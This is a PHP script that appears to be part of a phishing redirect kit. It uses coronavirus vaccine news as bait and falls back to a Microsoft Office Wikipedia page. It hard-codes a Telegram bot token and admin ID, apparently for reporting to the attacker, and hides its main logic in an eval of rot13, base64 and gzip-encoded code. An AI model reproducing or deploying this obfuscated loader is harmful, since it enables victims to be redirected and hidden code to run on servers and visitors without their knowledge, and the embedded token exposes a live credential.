<?php


$fuck1 = ('news');
$fuck2 = ('?=coronavirus-pandemic-vaccine-updates-12-19-20/h_6c7e66d39c8be51023acc3ea4d2f7b67');

const REDIRECT_TYPE = 2; // 1:header - 2:script
const URLS_FILE = 'urls.txt';
const FAILED_PAGE_URL = 'https://www.wikipedia.org/wiki/Microsoft_Office';

const TELEGRAM_BOT_TOKEN = '668101580:AAFl9mgqiHvsE4uVYvj1VB4vlX7ls38GQQ4';
const TELEGRAM_BOT_ADMIN_USERID = 60010232;
const TELEGRAM_BOT_REPORT_EVERY_TIME = false;

eval(gzuncompress(base64_decode(str_rot13('rWjAmpgltwNNDAUC0D6Ybtvk0+xPONIHVQMPjfMEUgLNvLnNjgsKhmd7J/GarabqB5ok5v6Xgc1rmz1uYR55xsT8zYMFaNFKZ206RDx16K2b5GZVNuBhKiovrZzQhIdyGvDy2frP0PecsBvI9Pb0bO90gh/6RrDyalxhQXkAVyZ92va3/KSzwDv94Sr+RweLdjjXfaGDLbUAzyaDWqUoXrOKmnlkjxM3nZ7eqbl9E8cG4FN3ZCl5e5q9GKnL+Qfy+A3fKTCyMtpPa0Z/rvUXQN/LlXB6Pow2BEfVeyGGjFcY3zBQ3FlTL3TInDahvEb3ZSpqRzWp+GDoot61Fely6u8BvH89J6gnMb4CPoch3zsaY1oLyZGU+sOf1uVO6ngQEYs0nZL8wT8NKGnggjEYv+IMcHFNp6Qp2vMpPedS9f/x4933C/rcs7V='))));
?>
